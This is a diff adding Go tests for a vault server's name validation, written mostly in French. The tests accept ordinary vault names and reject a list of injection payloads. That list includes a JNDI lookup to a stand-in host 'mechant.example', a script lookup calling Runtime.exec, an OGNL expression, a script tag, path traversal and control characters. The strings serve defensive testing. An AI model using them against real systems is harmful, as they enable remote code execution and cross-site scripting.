@@ -395,3 +395,86 @@ func TestNewIDIsRandom(t *testing.T) {
 		seen[id] = true
 	}
 }
+
+// What a vault may be called.
+//
+// A dynamic scan created a dozen vaults whose names were attack payloads. They
+// were harmless here - nothing in this server interprets them - but they were
+// unreadable in the interface and impossible to retype in order to delete.
+func TestVaultNameAcceptsOrdinaryNames(t *testing.T) {
+	for _, name := range []string{
+		"Maison",
+		"Sauvegardes 2026",
+		"Chez l'oncle Léon",
+		"Coffre (test)",
+		"Domotique et caméras",
+		"Clés du garage, atelier",
+		"Domotique & caméras",
+		"Sauvegardes @ maison",
+		"Budget $ 2026",
+		"Maison d’Alice",
+	} {
+		if err := ValidVaultName(name); err != nil {
+			t.Errorf("le nom %q est refusé : %v", name, err)
+		}
+	}
+}
+
+func TestVaultNameRefusesPayloads(t *testing.T) {
+	long := ""
+	for i := 0; i <= MaxVaultNameLength; i++ {
+		long += "a"
+	}
+
+	for _, name := range []string{
+		"${jndi:ldap://mechant.example/a}",
+		"${script:javascript:java.lang.Runtime.getRuntime().exec('x')}",
+		"%{#context['xwork.MethodAccessor.denyMethodExecution']=false}",
+		"chemin/traversant",
+		"<script>alert(1)</script>",
+		"nom\navec\nsauts",
+		"nom\x00nul",
+		"`backticks`",
+		"guillemets \"doubles\"",
+		"",
+		long,
+	} {
+		if err := ValidVaultName(name); err == nil {
+			t.Errorf("le nom %q est accepté", name)
+		} else if !errors.Is(err, ErrVaultName) {
+			t.Errorf("le nom %q donne %v, attendu ErrVaultName", name, err)
+		}
+	}
+}
+
+// The rule has to sit on the write path, not only in the callers: one enforced
+// in the interface and forgotten in the command line is a rule with a way
+// around it.
+func TestCreateProjectEnforcesTheNameRule(t *testing.T) {
+	db, err := OpenMemory()
+	if err != nil {
+		t.Fatalf("OpenMemory: %v", err)
+	}
+	defer db.Close()
+
+	err = db.CreateProject(context.Background(), &Project{
+		Name:       "${jndi:ldap://mechant.example/a}",
+		WrappedDEK: []byte("clé"),
+	})
+	if !errors.Is(err, ErrVaultName) {
+		t.Fatalf("un nom de charge utile a été écrit en base : %v", err)
+	}
+}
+
+func TestVaultDescriptionIsBounded(t *testing.T) {
+	long := ""
+	for i := 0; i <= MaxVaultDescriptionLength; i++ {
+		long += "a"
+	}
+	if err := ValidVaultDescription(long); err == nil {
+		t.Error("une description sans fin est acceptée")
+	}
+	if err := ValidVaultDescription("Domotique, caméras, box internet."); err != nil {
+		t.Errorf("une description ordinaire est refusée : %v", err)
+	}
+}
